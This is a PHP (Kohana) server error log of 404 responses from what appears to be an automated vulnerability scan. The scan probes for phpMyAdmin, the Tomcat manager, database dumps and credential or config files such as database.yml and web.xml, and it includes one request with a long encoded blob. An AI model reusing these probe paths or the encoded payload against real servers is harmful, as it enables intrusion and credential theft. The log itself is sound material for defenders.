2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php5-cgi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL cgi-bin/php5-cgi was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmyadmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmyadmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL manager/html was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 111 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMyAdmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMyAdmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml_original ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml_original ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pma/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: pma/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL xz8CSYSL was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL xz8CSYSL was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mysql/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mysql/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml.pgsql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml.pgsql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml_ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml_ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: db/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml.sqlite3 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: config/database.yml.sqlite3 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml.bak ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml.bak ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbadmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: dbadmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml (copy) ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml (copy) ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mysqladmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: mysqladmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml - Copy ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/web.xml - Copy ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml_original ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml_original ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:36 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: PMA/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:36 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: PMA/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/Copy of web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/Copy of web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: myadmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: myadmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF (copy)/web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF (copy)/web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml.pgsql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml.pgsql ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmyadmin2/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpmyadmin2/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF - Copy/web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF - Copy/web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml.sqlite3 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: app/config/database.yml.sqlite3 ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMyAdmin2/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: phpMyAdmin2/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-db.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Copy of WEB-INF/web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Copy of WEB-INF/web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/pma/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/pma/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/phpmyadmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/phpmyadmin/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: aClOBbguXP.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: aClOBbguXP.cfm ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: application/configs/application.ini ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: application/configs/application.ini ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml~ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/mysql/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: admin/mysql/main.php ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_database.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34_database.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: da6z98n1.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: da6z98n1.txt ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL phpMyAdmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL phpMyAdmin was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL logs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL logs was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml_ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml_ ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-database.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: 34-database.sql.gz ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml.bak ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml.bak ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL pma was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL pma was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL em/afr/duqjc/remote/H4sIAAAAAAAACnWMsU7DMBCGr6RRU9QBGBg6VmK1FYqaCgaQkCoihQXEjts4tZGJjX0Fs_AYPAUvgXiCrsysvAESOFVWfulO30n3f2_fEDsLu3fskZEVSkUumBOXzMS9z_eP_dt1BFsz2FaalTO2QG1z6KOw3AmtSm9Oz6DJ4CkJeydMJ8gGG1nNkdxcFa8H2WT482Uj6OWQiCA_1yXPoWu0xQL6bIVCW4nPCHtFU6SK1Ut6jVbWy5MCupVU_AFeIAostMOWE2M16oVW7R1ZXm3Qm982CEMhMZuOx+lhdjRNJxWbp2TunSP3HKFDm_8YgxbRGI8wauCY0v9b1P8BKxzSCTEBAAA= was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL em/afr/duqjc/remote/H4sIAAAAAAAACnWMsU7DMBCGr6RRU9QBGBg6VmK1FYqaCgaQkCoihQXEjts4tZGJjX0Fs_AYPAUvgXiCrsysvAESOFVWfulO30n3f2_fEDsLu3fskZEVSkUumBOXzMS9z_eP_dt1BFsz2FaalTO2QG1z6KOw3AmtSm9Oz6DJ4CkJeydMJ8gGG1nNkdxcFa8H2WT482Uj6OWQiCA_1yXPoWu0xQL6bIVCW4nPCHtFU6SK1Ut6jVbWy5MCupVU_AFeIAostMOWE2M16oVW7R1ZXm3Qm982CEMhMZuOx+lhdjRNJxWbp2TunSP3HKFDm_8YgxbRGI8wauCY0v9b1P8BKxzSCTEBAAA= was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml (copy) ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml (copy) ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL mysql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL mysql was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backoffice/login.zul ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: backoffice/login.zul ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml - Copy ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/jboss-web.xml - Copy ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: The requested URL db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: The requested URL db was not found on this server. ~ SYSPATH/classes/kohana/request/client/internal.php [ 87 ]
--
#0 /var/www/html/system/classes/kohana/request/client.php(64): Kohana_Request_Client_Internal->execute_request(Object(Request))
#1 /var/www/html/system/classes/kohana/request.php(1154): Kohana_Request_Client->execute(Object(Request))
#2 /var/www/html/index.php(115): Kohana_Request->execute()
#3 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/Copy of jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
2025-10-29 19:27:37 --- STRACE: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: WEB-INF/Copy of jboss-web.xml ~ SYSPATH/classes/kohana/request.php [ 1142 ]
--
#0 /var/www/html/index.php(115): Kohana_Request->execute()
#1 {main}
2025-10-29 19:27:37 --- ERROR: HTTP_Exception_404 [ 404 ]: Unable to find a route to match the URI: Trace.axd ~ SYSPATH/classes/kohana/request.php [ 1142 ]
